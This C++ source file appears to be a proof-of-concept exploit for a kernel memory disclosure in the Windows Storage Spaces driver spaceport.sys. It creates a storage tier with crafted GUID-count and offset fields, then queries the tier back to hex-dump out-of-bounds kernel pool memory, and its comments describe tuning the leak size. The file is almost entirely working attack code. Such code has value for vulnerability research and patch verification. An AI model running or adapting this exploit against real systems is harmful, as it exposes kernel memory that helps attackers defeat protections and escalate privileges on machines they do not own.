#include "spaceport.h"
#include "hexdump.hpp"
#include <iostream>
#include <rpc.h>
#include <stdio.h>

#pragma comment(lib, "Rpcrt4.lib")

#define DEVICE_NAME "\\\\?\\GLOBALROOT\\Device\\Spaceport"

// by changing this number you can leak more or less data
#define NUMGUIDSLEAK 6
#define SIZELEAK NUMGUIDSLEAK * 16

/* IOCTL codes used by spaceport.sys*/
#define SpIoctlGetPools 0xE70004
#define SpIoctlGetPoolInfo 0xE70008
#define SpIoctlCreateTier 0xE7D410
#define SpIoctlDeleteTier 0xE7D414
#define SpIoctlGetTierInfo 0xE71408

/*structure that will contain the list of pools when calling SpIoctlGetPools*/
typedef struct {
  ULONG nbPools;
  GUID listGuids[];
} POOLSLIST, *PPOOLSLIST;

/*structure containing pool information when calling SpIoctlgetPoolInfo*/
typedef struct {
  int size;
  GUID PoolId;
  int field_14;
  wchar_t friendlyName[256];
  wchar_t description[1024];
  __int16 field_A18; // because needs more reversing
  BYTE gapA1A[82];   // because needs more reversing
  int thinProvisioningAlertThresholds;
  BYTE gapA70[143]; // because needs more reversing
  char field_AFF;   // because needs more reversing
} POOLINFO, *PPOOLINFO;

/*structure to use when creating a tier*/
typedef struct {
  int length_bis;
  int length;
  GUID PoolGUID;
  GUID TierGUID;
  GUID spaceGUID;
  wchar_t friendlyName[256];
  wchar_t description[1024];
  int usage;
  int field_A3C;
  __int64 field_A40;
  BYTE gapA48[16];
  int field_A58;
  int field_A5C;
  __int64 field_A60;
  int mediatype;
  int field_A6C;
  int faultDomainAwareness;
  int AllocationUnitSize;
  int field_A78;
  int numOfGuids;
  int offsetGuids;
  int field_A84;
  int physicalDiskRedundancy;
  int NumberOfDataCopies;
  int field_A90;
  int NumberOfColumns;
  int Interleave;
  int field_A9C;
  int field_AA0;
  int field_AA4;
  __int64 field_AA8;
} POOLTIER, *PPOOLTIER;

/* structure used while getting the tierinfo with the leak.
         It is in fact a POOLTIER with additional data, where leaked memory get
   copied into. I know this is ugly, and that i could have just added a field
   with unknonw length in POOLTIER, but meh...
*/
typedef struct {
  int length;
  GUID poolGUID;
  GUID tierGUID;
  char data[0x1000]; // because on output, we get a pooltier structure
} POOLTIERLEAK, *PPOOLTIERLEAK;

/* structure used when calling SpIoctlDeleteTier*/
typedef struct {
  GUID poolGUID;
  GUID tierGUID;
} POOLDELETETIER, *PPOOLDELETETIER;

/*globales */
HANDLE hDevice = NULL; // handle to spaceport.sys

// some wrapper to open the device
uint32_t OpenDeviceInternalA(_In_ char *deviceName, _In_ BOOL fatalOnError,
                             _In_ BOOL asyncMode, _Out_ HANDLE *deviceHandle) {
  HANDLE hDevice = NULL;
  if (asyncMode) {
    hDevice = CreateFileA(deviceName, GENERIC_READ | GENERIC_WRITE, 0, NULL,
                          OPEN_EXISTING,
                          FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED, 0);
  } else {
    hDevice = CreateFileA(deviceName, GENERIC_READ | GENERIC_WRITE, 0, NULL,
                          OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
  }
  *deviceHandle = hDevice;
  if (NULL == hDevice || INVALID_HANDLE_VALUE == hDevice) {
    if (fatalOnError) {
      printf("[-] ERROR : cannot open device %s, exiting...\n", deviceName);
      exit(EXIT_FAILURE);
    }
    return EXIT_FAILURE;
  }
  return EXIT_SUCCESS;
}

uint32_t EnsureDeviceOpened(_In_ BOOL fatalOnError) {
  if (hDevice == NULL) {
    if (fatalOnError)
      return OpenDeviceInternalA((char *)DEVICE_NAME, TRUE, FALSE, &hDevice);
    else
      return OpenDeviceInternalA((char *)DEVICE_NAME, FALSE, FALSE, &hDevice);

  } else
    return EXIT_SUCCESS;
}

/*
        this function gets the pool's GUID associated with the given pool's
   name, if it exists this is used primarily because it's easier to ask for pool
   name on commandline, but almost all spaceport.sys functions require the pool
   GUID instead of the name.
*/
uint32_t GetAssociatedPoolW(_In_ wchar_t *poolName, _Out_ GUID *outPoolGUID) {
  uint32_t ret = EXIT_SUCCESS;
  BOOL res = FALSE;
  uint32_t tmpsize = 0;
  DWORD returnedBytes = 0;
  DWORD nbPoolsToQuery = 1;

  *outPoolGUID = {0};

  PPOOLSLIST poolslist = (PPOOLSLIST)malloc(
      sizeof(POOLSLIST)); // we just get the number of pools in the first query,
  PPOOLSLIST tmpPoolsList;
  if (NULL == poolslist) {
    printf("failed allocating memory for pools list, exiting\n");
    return EXIT_FAILURE;
  }

  POOLINFO poolInfo = {0};

  if (EXIT_SUCCESS != EnsureDeviceOpened(FALSE)) {
    printf("cannot open the device, stopping\n");
    goto FAILURE;
  }

  res = DeviceIoControl(hDevice, SpIoctlGetPools, poolslist, 4, poolslist, 4,
                        &returnedBytes, 0);

  if (!res) {
    uint32_t tmpErr = GetLastError();
    if (tmpErr != ERROR_MORE_DATA) {
      printf("failed getting length of pools list with code : %i\n",
             GetLastError());
      goto FAILURE;
    }
  }

  nbPoolsToQuery = poolslist->nbPools;
  tmpsize = sizeof(POOLSLIST) + nbPoolsToQuery * sizeof(GUID);
  tmpPoolsList = (PPOOLSLIST)realloc(
      poolslist, tmpsize); // and finally all pools' GUIDs in the second query
  if (NULL == tmpPoolsList) {
    printf("failed allocating enough memory for pools list to contain all "
           "pools, exiting\n");
    goto FAILURE;
  } else
    poolslist = tmpPoolsList;

  res = DeviceIoControl(hDevice, SpIoctlGetPools, poolslist, tmpsize, poolslist,
                        tmpsize, &returnedBytes, 0);

  if (!res) {
    printf("failed getting complete pools list with code : %i\n",
           GetLastError());
    goto FAILURE;
  }

  // now that we got all guids, we query all the pools' info to search for the
  // one with the name given
  for (uint32_t i = 0; i < nbPoolsToQuery; i++) {
    memset(&poolInfo, 0, sizeof(POOLINFO));
    poolInfo.size = 0x28;
    poolInfo.PoolId = poolslist->listGuids[i];

    res = DeviceIoControl(hDevice, SpIoctlGetPoolInfo, &poolInfo, 0x28,
                          &poolInfo, 0xb00, &returnedBytes, 0);

    if (!res) {
      uint32_t tmpErr = GetLastError();
      if (ERROR_MORE_DATA != tmpErr) {
        printf("failed querying for pool info : %i\n", tmpErr);
        goto FAILURE;
      }
    }

    if (wcsncmp(poolName, poolInfo.friendlyName, wcslen(poolName)) == 0) {
      *outPoolGUID = poolslist->listGuids[i];
      goto END;
    }
  }

  // if we are here, we have failed
  goto FAILURE;

END:
  if (poolslist)
    free(poolslist);

  return ret;

FAILURE:
  ret = EXIT_FAILURE;
  goto END;
}

// because pools store their name and description as wchar_t, then this function
// just makes the translation to compare with a string
uint32_t GetAssociatedPoolA(_In_ char *poolName, _Out_ GUID *outPoolGUID) {
  uint32_t ret = EXIT_FAILURE;
  size_t size = strlen(poolName) + 1;
  size_t u = 0;
  wchar_t *poolNameW = (wchar_t *)malloc(size * 2);
  if (!poolNameW) {
    printf("cannot get enough memory to call the internal unicode function\n");
    *outPoolGUID = {0};
    return EXIT_FAILURE;
  }
  mbstowcs_s(&u, poolNameW, size, poolName, size - 1);
  ret = GetAssociatedPoolW(poolNameW, outPoolGUID);
  free(poolNameW);
  return ret;
}

uint32_t SendIoctlDeleteTier(_In_ POOLDELETETIER pooldeletetier) {
  uint32_t ret = EXIT_SUCCESS;
  BOOL res = FALSE;
  DWORD returnedBytes = 0;

  if (EXIT_SUCCESS != EnsureDeviceOpened(FALSE)) {
    printf("cannot open the device, stopping\n");
    goto FAILURE;
  }

  res = DeviceIoControl(hDevice, SpIoctlDeleteTier, &pooldeletetier,
                        sizeof(POOLDELETETIER), &pooldeletetier,
                        sizeof(POOLDELETETIER), &returnedBytes, 0);

  if (!res) {
    printf("failed deleting tier with code : %i\n", GetLastError());
    goto FAILURE;
  }

END:
  return ret;

FAILURE:
  ret = EXIT_FAILURE;
  goto END;
}

uint32_t SendIoctlCreateTier(_In_ POOLTIER pooltier) {
  uint32_t ret = EXIT_SUCCESS;
  BOOL res = FALSE;
  DWORD returnedBytes = 0;

  if (EXIT_SUCCESS != EnsureDeviceOpened(FALSE)) {
    printf("cannot open the device, stopping\n");
    goto FAILURE;
  }

  res = DeviceIoControl(hDevice, SpIoctlCreateTier, &pooltier, sizeof(POOLTIER),
                        &pooltier, sizeof(POOLTIER), &returnedBytes, 0);

  if (!res) {
    printf("failed creating tier with code : %i\n", GetLastError());
    goto FAILURE;
  }

END:
  return ret;

FAILURE:
  ret = EXIT_FAILURE;
  goto END;
}

uint32_t SendIoctlGetTierInfo(_In_ PPOOLTIERLEAK pooltierleak) {
  uint32_t ret = EXIT_SUCCESS;
  BOOL res = FALSE;
  DWORD returnedBytes = 0;

  if (EXIT_SUCCESS != EnsureDeviceOpened(FALSE)) {
    printf("cannot open the device, stopping\n");
    goto FAILURE;
  }

  res = DeviceIoControl(hDevice, SpIoctlGetTierInfo, pooltierleak,
                        sizeof(POOLTIERLEAK), pooltierleak,
                        sizeof(POOLTIERLEAK), &returnedBytes, 0);

  if (!res) {
    uint32_t tmpErr = GetLastError();
    if (tmpErr != ERROR_MORE_DATA) {
      printf("failed get tier info with code : %i\n", GetLastError());
    }
    goto FAILURE;
  }

END:
  return ret;

FAILURE:
  ret = EXIT_FAILURE;
  goto END;
}

/*
        this function initialize a tier. the values used to initialize the tier
   are the ones usually found when creating a tier with the new-storagetier
   powershell cmdlet.
*/
uint32_t InitPoolTier(_Inout_ PPOOLTIER pooltier, _In_ GUID poolGUID,
                      _Out_ GUID *tierGUID) {
  wchar_t name[] = L"Test tier";
  wchar_t description[] = L"test description";

  pooltier->length = sizeof(POOLTIER);
  pooltier->length_bis = sizeof(POOLTIER);
  pooltier->PoolGUID = poolGUID;
  if (RPC_S_OK != UuidCreate(&(pooltier->TierGUID))) {
    printf("cannot create a guid for the tier\n");
    *tierGUID = {0};
    return EXIT_FAILURE;
  }

  wcsncpy_s(pooltier->friendlyName, name, wcslen(name));
  wcsncpy_s(pooltier->description, description, wcslen(description));

  pooltier->usage = 1;
  pooltier->field_A58 = 2;
  pooltier->field_A60 = -1;
  pooltier->mediatype = 2;
  pooltier->field_A6C = 1;
  pooltier->faultDomainAwareness = 1;
  pooltier->field_A84 = 2;
  pooltier->physicalDiskRedundancy = 1;
  pooltier->NumberOfDataCopies = 2;
  pooltier->field_A90 = 1;
  pooltier->NumberOfColumns = -1;
  pooltier->Interleave = 0x40000;

  *tierGUID = pooltier->TierGUID;
  return EXIT_SUCCESS;
}

/* tries to create a normal tier, and then deletes it. Validates that we could
 * create a tier from whom we get the leak*/
uint32_t CheckCreateTier(GUID poolGUID) {
  uint32_t ret = EXIT_SUCCESS;
  POOLTIER pooltier = {0};
  POOLDELETETIER deletetier = {0};
  GUID tierGUID = {0};
  if (EXIT_SUCCESS != InitPoolTier(&pooltier, poolGUID, &tierGUID)) {
    printf("not able to correctly initialize pool tier, aborting\n");
    goto FAILURE;
  }

  if (EXIT_SUCCESS != SendIoctlCreateTier(pooltier)) {
    printf("failed creating tier, aborting\n");
    goto FAILURE;
  }

  deletetier.poolGUID = poolGUID;
  deletetier.tierGUID = tierGUID;

  if (EXIT_SUCCESS != SendIoctlDeleteTier(deletetier)) {
    printf("failed deleting tier, aborting\n");
    goto FAILURE;
  }

END:
  return ret;

FAILURE:
  ret = EXIT_FAILURE;
  goto END;
}

/* the main function to get the leak*/
uint32_t GetLeak(GUID poolGUID) {
  uint32_t ret = EXIT_SUCCESS;
  POOLTIER pooltier = {0};
  POOLTIERLEAK pooltierleak = {0};
  POOLDELETETIER deletetier = {0};
  GUID tierGUID = {0};
  BOOL tierOk = FALSE;

  unsigned char data[SIZELEAK] = {0};

  if (EXIT_SUCCESS != InitPoolTier(&pooltier, poolGUID, &tierGUID)) {
    printf("not able to correctly initialize pool tier, aborting\n");
    goto FAILURE;
  }

  pooltier.numOfGuids = NUMGUIDSLEAK;
  pooltier.offsetGuids =
      0xab0; // size of the vs chunk corresponding to IRP - offset to system
             // buffer in the block + size to go outside

  if (EXIT_SUCCESS != SendIoctlCreateTier(pooltier)) {
    printf("failed creating tier, aborting\n");
    goto FAILURE;
  }
  tierOk = TRUE;

  pooltierleak.length = 0x28;
  pooltierleak.poolGUID = poolGUID;
  pooltierleak.tierGUID = tierGUID;
  if (EXIT_SUCCESS != SendIoctlGetTierInfo(&pooltierleak)) {
    printf("failed getting tier info, aborting\n");
    goto FAILURE;
  }

  // guids, representing data leaked, are copied at the end of the POOLTIER
  // structure, so let's just get them.
  memcpy(data, (void *)((uintptr_t)(&pooltierleak) + 0xab0), SIZELEAK);
  printf("here is the leak : \n");
  std::cout << Hexdump(data, SIZELEAK) << std::endl;

END:
  if (tierOk) /*make sure we delete the tier*/
  {
    deletetier.poolGUID = poolGUID;
    deletetier.tierGUID = tierGUID;

    if (EXIT_SUCCESS != SendIoctlDeleteTier(deletetier)) {
      printf("failed deleting tier, aborting\n");
      goto FAILURE;
    }
  }

  return ret;

FAILURE:
  ret = EXIT_FAILURE;
  goto END;
}